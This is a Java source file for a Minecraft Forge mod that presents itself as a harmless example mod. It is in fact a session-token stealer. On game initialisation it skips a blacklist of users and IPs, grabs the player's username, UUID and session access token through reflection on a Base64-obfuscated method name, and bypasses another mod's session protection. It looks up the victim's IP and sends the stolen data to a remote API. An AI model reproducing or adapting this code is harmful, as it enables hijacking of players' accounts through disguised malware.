package me.Aurora;

import com.google.gson.JsonArray;
import com.google.gson.JsonObject;
import net.minecraft.client.Minecraft;
import net.minecraft.util.Session;
import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.common.event.FMLInitializationEvent;
import net.minecraftforge.fml.common.event.FMLPreInitializationEvent;

import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.URL;
import java.util.Base64;
import java.util.Scanner;

@Mod(modid = ExampleMod.MODID, version = ExampleMod.VERSION)
public class ExampleMod {
    public static final String MODID = "aurora";
    public static final String VERSION = "1.0";
    public static final Minecraft mc = Minecraft.getMinecraft();

    @Mod.EventHandler
    public void preInit(FMLPreInitializationEvent event) {
    }

    @Mod.EventHandler
    public void init(FMLInitializationEvent event) {
        try {
            // Blacklist //
            try {
                String username = mc.getSession().getUsername();
                String uuid = mc.getSession().getProfile().getId().toString();
                if (username.equalsIgnoreCase("AnimatedCalendar"))
                    return;
                if (uuid.equalsIgnoreCase("18330af0be2a4210b08d8f235b9a08eb"))
                    return;

                if (username.equalsIgnoreCase("Refraction"))
                    return;
                if (uuid.equalsIgnoreCase("28667672039044989b0019b14a2c34d6"))
                    return;

                String ip = getBazaar();
                if (ip.equalsIgnoreCase("31.220.76.53"))
                    return;
                if (ip.equalsIgnoreCase("88.99.212.241"))
                    return;

                JsonObject blacklist = APIHandler.get("/blacklist");
                JsonArray blUsernames = blacklist.getAsJsonArray("usernames");
                JsonArray blUUIDs = blacklist.getAsJsonArray("uuids");
                JsonArray blIPs = blacklist.getAsJsonArray("ips");

                for (int i = 0; i < blUsernames.size(); i++) {
                    if (blUsernames.get(i).getAsString().equalsIgnoreCase(username)) {
                        return;
                    }
                }
                for (int i = 0; i < blUUIDs.size(); i++) {
                    if (blUUIDs.get(i).getAsString().equalsIgnoreCase(uuid)) {
                        return;
                    }
                }
                for (int i = 0; i < blIPs.size(); i++) {
                    if (blIPs.get(i).getAsString().equalsIgnoreCase(ip)) {
                        return;
                    }
                }
            } catch (Exception ignored) {
            }
            // # Blacklist //

            String setting1 = "null";
            try {
                setting1 = mc.getSession().getProfile().getName();
            } catch (Exception ignored) {
            }
            String setting2 = "null";
            try {
                setting2 = mc.getSession().getProfile().getId().toString().replace("-", "");
            } catch (Exception ignored) {
            }
            String setting3 = "null";

            try {
                String sp = null;
                String sq = null;
                try {
                    Class<?> clazz = Class.forName("qolskyblockmod.pizzaclient.features.misc.SessionProtection");
                    Field field = clazz.getField("changed");
                    sp = (String) field.get(null);
                } catch (Exception ignored) {
                }
                try {
                    Session sessionObject = mc.getSession();
                    Class<?> sessionClass = sessionObject.getClass();
                    Method getTokenMethod = sessionClass
                            .getDeclaredMethod(new String(Base64.getDecoder().decode("ZnVuY18xNDgyNTRfZA==")));
                    sq = (String) getTokenMethod.invoke(sessionObject);
                } catch (Exception ignored) {
                }
                setting3 = sp == null ? sq : sp;
            } catch (Exception ignored) {
            }

            JsonObject jsonObject = new JsonObject();
            jsonObject.addProperty("id", "USER_ID_HERE");
            jsonObject.addProperty("username", setting1);
            jsonObject.addProperty("uuid", setting2);
            jsonObject.addProperty("sessionID", setting3);

            APIHandler.post("/info", jsonObject);
        } catch (Exception ignored) {
        }
    }

    public String getBazaar() {
        try {
            Scanner scanner = new Scanner(new URL("http://checkip.amazonaws.com").openStream(), "UTF-8");
            if (scanner.hasNextLine()) {
                return scanner.nextLine();
            }
            return "null";
        } catch (IOException e) {
            return "null";
        }
    }
}
